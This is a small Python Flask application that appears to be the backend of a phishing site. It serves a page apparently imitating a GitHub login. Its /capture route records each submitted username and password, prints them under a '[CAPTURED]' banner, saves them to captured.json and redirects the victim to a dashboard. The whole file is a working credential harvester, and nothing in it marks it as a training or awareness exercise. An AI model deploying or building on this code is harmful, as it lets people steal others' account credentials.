from flask import Flask, render_template, request, redirect, url_for
import json
import os
from datetime import datetime

app = Flask(__name__)

CAPTURED_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "captured.json")


def load_captured():
    if os.path.exists(CAPTURED_FILE):
        with open(CAPTURED_FILE, "r") as f:
            return json.load(f)
    return {"entries": []}


def save_captured(data):
    with open(CAPTURED_FILE, "w") as f:
        json.dump(data, f, indent=2)


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/register")
def register():
    return render_template("register.html")


@app.route("/github-login")
def github_login():
    return render_template("github_login.html")


@app.route("/dashboard")
def dashboard():
    return render_template("dashboard.html")


@app.route("/capture", methods=["POST"])
def capture():
    username = request.form.get("username", "")
    password = request.form.get("password", "")

    entry = {
        "username": username,
        "password": password,
        "timestamp": datetime.now().isoformat(),
    }

    print(f"\n[CAPTURED] Username: {username} | Password: {password} | Time: {entry['timestamp']}\n")

    data = load_captured()
    data["entries"].append(entry)
    save_captured(data)

    return redirect(url_for("dashboard"))


if __name__ == "__main__":
    app.run(debug=True, port=5000)
